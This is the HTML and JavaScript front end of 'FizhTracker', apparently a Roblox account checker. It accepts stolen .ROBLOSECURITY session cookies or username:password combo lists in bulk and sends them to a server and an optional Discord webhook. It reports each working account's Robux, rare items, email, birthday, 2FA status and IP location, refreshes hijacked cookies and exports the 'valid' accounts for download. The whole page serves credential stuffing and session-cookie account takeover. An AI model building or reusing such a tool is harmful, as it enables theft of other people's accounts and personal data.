<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FizhTracker</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: #0b0912; color: #f0f0f0; padding: 20px; min-height: 100vh; display: flex; justify-content: center; align-items: flex-start; }
        .container { max-width: 1100px; width: 100%; background: #12101c; padding: 28px; border-radius: 20px; border: 1px solid #2a2840; }
        .header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; margin-bottom: 20px; }
        .header h1 { font-size: 32px; font-weight: 800; background: linear-gradient(135deg, #a548ff, #ee3e9c); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .header span { font-size: 13px; color: #888; background: #1f1d2e; padding: 4px 14px; border-radius: 20px; }
        .webhook-box { background: #1a1728; padding: 12px 16px; border-radius: 12px; margin-bottom: 20px; border: 1px solid #2a2840; }
        .webhook-box label { font-size: 13px; color: #9aa0c4; display: block; margin-bottom: 4px; }
        .webhook-box input { width: 100%; padding: 10px 14px; border-radius: 10px; border: none; background: #0f0d1a; color: #fff; font-size: 14px; outline: 1px solid #2a2840; }
        .webhook-box input:focus { outline-color: #8b4cff; }
        .row { display: flex; gap: 24px; flex-wrap: wrap; }
        .col { flex: 1; min-width: 300px; background: #191827; padding: 22px; border-radius: 16px; border: 1px solid #2a2840; }
        .col h2 { font-size: 20px; margin-bottom: 16px; color: #c8bfff; }
        .mode-group { display: flex; gap: 20px; margin-bottom: 14px; }
        .mode-group label { display: flex; align-items: center; gap: 6px; color: #aaa; cursor: pointer; font-size: 14px; }
        .mode-group input[type="radio"] { accent-color: #8b4cff; width: 16px; height: 16px; }
        label { display: block; font-size: 13px; color: #9aa0c4; margin: 10px 0 4px; }
        input, textarea, select { width: 100%; padding: 10px 14px; border-radius: 10px; border: none; background: #0f0d1a; color: #fff; font-size: 14px; outline: 1px solid #2a2840; transition: 0.2s; }
        input:focus, textarea:focus { outline-color: #8b4cff; }
        textarea { height: 70px; resize: vertical; }
        .file-upload { margin: 8px 0; }
        .file-upload input[type="file"] { background: #0f0d1a; padding: 8px; border-radius: 10px; }
        .btn { background: linear-gradient(100deg, #824cff, #f03b8e); color: #fff; border: none; padding: 12px 24px; border-radius: 12px; font-weight: 700; font-size: 15px; cursor: pointer; transition: 0.3s; margin-top: 14px; width: 100%; }
        .btn:hover { transform: scale(1.02); opacity: 0.9; }
        .btn-refresh { background: linear-gradient(100deg, #2a7a4a, #1a5a3a); color: #fff; border: none; padding: 8px 16px; border-radius: 8px; font-weight: 600; font-size: 13px; cursor: pointer; transition: 0.3s; margin-top: 8px; }
        .btn-refresh:hover { opacity: 0.8; transform: scale(1.02); }
        .result-box { margin-top: 18px; background: #0f0d1a; padding: 14px; border-radius: 12px; max-height: 600px; overflow-y: auto; font-size: 13px; color: #c8d0e0; border: 1px solid #1f1d2e; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; }
        .result-box .game-item { display: flex; align-items: center; gap: 10px; margin: 6px 0; padding: 6px 10px; background: #1a1728; border-radius: 8px; border: 1px solid #2a2840; }
        .result-box .game-item img { width: 40px; height: 40px; border-radius: 6px; object-fit: cover; border: 1px solid #3a3a5a; }
        .result-box .game-item .game-name { font-weight: 600; color: #c8bfff; }
        .result-box .game-item .game-visits { color: #9aa0c4; font-size: 12px; margin-left: auto; }
        .download-area { margin-top: 14px; display: none; }
        .download-area a { color: #28d79a; background: #0f1f1a; padding: 8px 18px; border-radius: 8px; text-decoration: none; display: inline-block; border: 1px solid #28d79a; font-weight: 600; }
        .login-fields { display: none; margin-top: 10px; }
        .login-fields.active { display: block; }
        .cookie-fields { display: block; }
        .cookie-fields.hidden { display: none; }
        .sub-info { font-size: 13px; color: #9aa0c4; margin-bottom: 12px; }
        .sub-info code { background: #0f0d1a; padding: 2px 8px; border-radius: 4px; color: #c8bfff; }
        .footer { margin-top: 28px; text-align: center; color: #555; font-size: 13px; border-top: 1px solid #1f1d2e; padding-top: 18px; }
        @media (max-width: 700px) { .col { min-width: 100%; } }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>🔐 FizhTracker</h1>
        <span>v3.0 · Roblox Checker</span>
    </div>
    <div class="webhook-box">
        <label>🔔 Discord Webhook (opsional)</label>
        <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/...">
    </div>
    <div class="row">
        <div class="col">
            <h2>📌 Single Check</h2>
            <div class="mode-group">
                <label><input type="radio" name="mode" value="cookie" checked onchange="toggleMode()"> Cookie</label>
                <label><input type="radio" name="mode" value="login" onchange="toggleMode()"> Login</label>
            </div>
            <div id="singleCookieFields" class="cookie-fields">
                <label>Cookie .ROBLOSECURITY</label>
                <input type="text" id="singleCookie" placeholder="_|WARNING:-DO-NOT-SHARE...">
            </div>
            <div id="singleLoginFields" class="login-fields">
                <label>Username</label>
                <input type="text" id="singleUser" placeholder="Username Roblox">
                <label>Password</label>
                <input type="password" id="singlePass" placeholder="Password">
            </div>
            <button class="btn" onclick="singleCheck()">▶ Check</button>
            <button class="btn-refresh" onclick="refreshCookie()" id="refreshBtn" style="display:none;">🔄 Refresh Cookie</button>
            <div id="singleResult" class="result-box">Hasil akan muncul di sini...</div>
        </div>
        <div class="col">
            <h2>📁 Bulk Check</h2>
            <div class="sub-info">
                Upload file .txt — <b>Cookie:</b> satu cookie/baris<br>
                <b>Login:</b> <code>username:password</code>/baris
            </div>
            <div class="file-upload">
                <input type="file" id="bulkFile" accept=".txt">
            </div>
            <button class="btn" onclick="bulkCheck()">▶ Check All</button>
            <div id="bulkResult" class="result-box">Hasil bulk akan muncul di sini...</div>
            <div class="download-area" id="downloadArea">
                <a id="downloadLink" download="fizhtracker_valid.txt">⬇️ Download Akun Valid</a>
            </div>
        </div>
    </div>
    <div class="footer">FizhTracker · Data hanya diproses di server · 2026</div>
</div>

<script>
    let lastCookie = '';

    // ===== DAFTAR ITEM SPESIAL =====
    const specialItems = [
        { name: '🦴 Korblox Deathspeaker', url: 'https://www.roblox.com/id/bundles/192/Korblox-Deathspeaker' },
        { name: '🎃 Headless Horseman Black', url: 'https://www.roblox.com/id/catalog/16302616897/Headless-Horseman-Black' },
        { name: '⚡ Headless Horseman\'s Korblox Valkyrie', url: 'https://www.roblox.com/id/catalog/80795843562476/Headless-Horsemans-Korblox-Valkyrie' },
        { name: '📦 Box Hat', url: 'https://www.roblox.com/id/catalog/80910835025581/box-hat' }
    ];

    function getItemDisplay(itemUrl) {
        const assetId = itemUrl.match(/\/(\d+)(?:\/|$)/)?.[1] || '';
        return assetId ? `https://www.roblox.com/asset-thumbnail/image?assetId=${assetId}&width=50&height=50` : '';
    }

    function toggleMode() {
        const mode = document.querySelector('input[name="mode"]:checked').value;
        document.getElementById('singleCookieFields').classList.toggle('hidden', mode !== 'cookie');
        document.getElementById('singleLoginFields').classList.toggle('active', mode === 'login');
    }

    function formatResult(data) {
        if (!data || data.error) return JSON.stringify(data, null, 2);
        let output = '';
        output += `<div style="margin-bottom:10px;">`;
        output += `<b>👤 Username</b> : ${data.username || 'N/A'}<br>`;
        output += `<b>🆔 User ID</b> : ${data.userID || 'N/A'}<br>`;
        output += `<b>📅 Age</b> : ${data.accountAge || 0} days<br><br>`;
        output += `<b>💰 Robux</b> : ${data.robux || 0}<br>`;
        output += `<b>📊 RAP</b> : ${data.rap || 0}<br>`;
        output += `<b>📦 Items</b> : ${data.itemCount || 0}<br><br>`;
        output += `<b>👥 Friends</b> : ${data.friends || 0}<br>`;
        output += `<b>👤 Followers</b> : ${data.followers || 0}<br><br>`;
        output += `<b>🦴 Korblox</b> : ${data.korblox ? '✅ Yes' : '❌ No'}<br>`;
        output += `<b>🎃 Headless</b> : ${data.headless ? '✅ Yes' : '❌ No'}<br><br>`;
        output += `<b>📧 Email</b> : ${data.email || 'N/A'}<br>`;
        output += `<b>✅ Verified</b> : ${data.emailVerified ? '✅ Yes' : '❌ No'}<br>`;
        output += `<b>📅 Birthday</b> : ${data.birthday || 'N/A'}<br>`;
        output += `<b>👶 Age Group</b> : ${data.ageGroup || 'N/A'}<br>`;
        output += `<b>🔒 2FA</b> : ${data.twoFactorEnabled ? '✅ On' : '❌ Off'}<br><br>`;
        output += `<b>📊 Total Games</b> : ${data.totalGamesPlayed || 0}<br><br>`;

        // ===== ITEM SPESIAL =====
        output += `<b>📦 ITEM LIST:</b><br>`;
        specialItems.forEach(item => {
            const thumb = getItemDisplay(item.url);
            const owned = (item.name.includes('Korblox') && data.korblox) || 
                         (item.name.includes('Headless') && data.headless) ? '✅' : '❌';
            output += `<div class="game-item">`;
            if (thumb) output += `<img src="${thumb}" onerror="this.style.display='none'" style="width:32px;height:32px;border-radius:4px;">`;
            output += `<span class="game-name">${owned} ${item.name}</span>`;
            output += `<span class="game-visits"><a href="${item.url}" target="_blank" style="color:#8b4cff;">🔗</a></span>`;
            output += `</div>`;
        });
        output += `<br>`;

        // ===== GAME HISTORY =====
        if (data.gameHistory && data.gameHistory.length > 0) {
            output += `<b>🎮 GAME HISTORY (Last 10):</b><br>`;
            data.gameHistory.slice(0, 10).forEach((g, i) => {
                const thumb = g.placeId ? `https://tr.rbxcdn.com/${g.placeId}/Thumbnail.png` : '';
                output += `<div class="game-item">`;
                if (thumb) output += `<img src="${thumb}" onerror="this.style.display='none'">`;
                output += `<span class="game-name">${i+1}. ${g.name}</span>`;
                output += `<span class="game-visits">${g.visits || 0} visits</span>`;
                output += `</div>`;
            });
            output += `<br>`;
        }

        if (data.ip) {
            output += `<b>📡 IP</b> : ${data.ip}<br>`;
            if (data.location) {
                output += `<b>🌍 Location</b> : ${data.location.city || 'Unknown'}, ${data.location.region || 'Unknown'}, ${data.location.country || 'Unknown'}<br>`;
                output += `<b>🏢 ISP</b> : ${data.location.isp || 'N/A'}<br>`;
                output += `<b>⏰ Timezone</b> : ${data.location.timezone || 'N/A'}<br>`;
            }
        }
        output += `</div>`;
        return output;
    }

    async function singleCheck() {
        const mode = document.querySelector('input[name="mode"]:checked').value;
        const webhook = document.getElementById('webhook').value.trim();
        let payload = { mode, webhook };
        if (mode === 'cookie') {
            const cookie = document.getElementById('singleCookie').value.trim();
            if (!cookie) return alert('Masukkan cookie!');
            lastCookie = cookie;
            payload.cookie = cookie;
        } else {
            const user = document.getElementById('singleUser').value.trim();
            const pass = document.getElementById('singlePass').value.trim();
            if (!user || !pass) return alert('Masukkan username dan password!');
            payload.username = user;
            payload.password = pass;
        }
        const el = document.getElementById('singleResult');
        el.textContent = '⏳ Memproses...';
        try {
            const res = await fetch('/api/check', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            const data = await res.json();
            if (data.valid) {
                document.getElementById('refreshBtn').style.display = 'inline-block';
                el.innerHTML = formatResult(data);
            } else {
                el.textContent = JSON.stringify(data, null, 2);
            }
        } catch (e) {
            el.textContent = '❌ Error: ' + e.message;
        }
    }

    async function refreshCookie() {
        if (!lastCookie) return alert('Tidak ada cookie untuk direfresh');
        const el = document.getElementById('singleResult');
        el.textContent = '⏳ Merefresh cookie...';
        try {
            const res = await fetch('/api/refresh', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ cookie: lastCookie })
            });
            const data = await res.json();
            if (data.newCookie) {
                document.getElementById('singleCookie').value = data.newCookie;
                lastCookie = data.newCookie;
                el.innerHTML = '✅ Cookie berhasil direfresh!<br><br>' + formatResult(data);
            } else {
                el.textContent = '❌ Gagal refresh cookie: ' + JSON.stringify(data);
            }
        } catch (e) {
            el.textContent = '❌ Error: ' + e.message;
        }
    }

    async function bulkCheck() {
        const fileInput = document.getElementById('bulkFile');
        const webhook = document.getElementById('webhook').value.trim();
        if (!fileInput.files || fileInput.files.length === 0) return alert('Pilih file!');
        const text = await fileInput.files[0].text();
        const lines = text.split('\n').map(s => s.trim()).filter(s => s.length > 0);
        if (lines.length === 0) return alert('File kosong!');

        const mode = document.querySelector('input[name="mode"]:checked').value;
        let payload = { mode, webhook };
        if (mode === 'cookie') {
            payload.cookies = lines;
        } else {
            const creds = lines.map(line => {
                const [u, p] = line.split(':').map(s => s.trim());
                return { username: u, password: p };
            }).filter(c => c.username && c.password);
            if (creds.length === 0) return alert('Format harus username:password per baris');
            payload.credentials = creds;
        }

        const el = document.getElementById('bulkResult');
        el.textContent = `⏳ Memproses ${lines.length} entri...`;
        try {
            const res = await fetch('/api/bulk', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            const data = await res.json();
            let out = `✅ ${data.valid.length} valid, ❌ ${data.invalid.length} invalid\n\n`;
            out += '🔹 VALID:\n' + data.valid.map(v => {
                if (mode === 'cookie') return `${v.cookie.slice(0,30)}... | ${v.username} | Robux: ${v.robux}`;
                else return `${v.login.username}:${v.login.password} | ${v.data?.username || 'N/A'}`;
            }).join('\n');
            out += '\n\n🔹 INVALID:\n' + data.invalid.join('\n');
            el.textContent = out;

            if (data.valid.length > 0) {
                let content = data.valid.map(v => {
                    if (mode === 'cookie') {
                        return `Cookie: ${v.cookie}\nUsername: ${v.username}\nUserID: ${v.userID}\nRobux: ${v.robux}\nAge: ${v.accountAge} days\nFriends: ${v.friends}\nFollowers: ${v.followers}\nRAP: ${v.rap}\nItems: ${v.itemCount}\nKorblox: ${v.korblox}\nHeadless: ${v.headless}\nTotal Games: ${v.totalGamesPlayed}\nIP: ${v.ip}\nLocation: ${v.location?.city}, ${v.location?.region}, ${v.location?.country}\nISP: ${v.location?.isp}\n---`;
                    } else {
                        return `User: ${v.login.username}:${v.login.password}\nData: ${JSON.stringify(v.data, null, 2)}\n---`;
                    }
                }).join('\n');
                const blob = new Blob([content], { type: 'text/plain' });
                const url = URL.createObjectURL(blob);
                document.getElementById('downloadLink').href = url;
                document.getElementById('downloadArea').style.display = 'block';
            } else {
                document.getElementById('downloadArea').style.display = 'none';
            }
        } catch (e) {
            el.textContent = '❌ Error: ' + e.message;
        }
    }
    toggleMode();
</script>
</body>
</html>
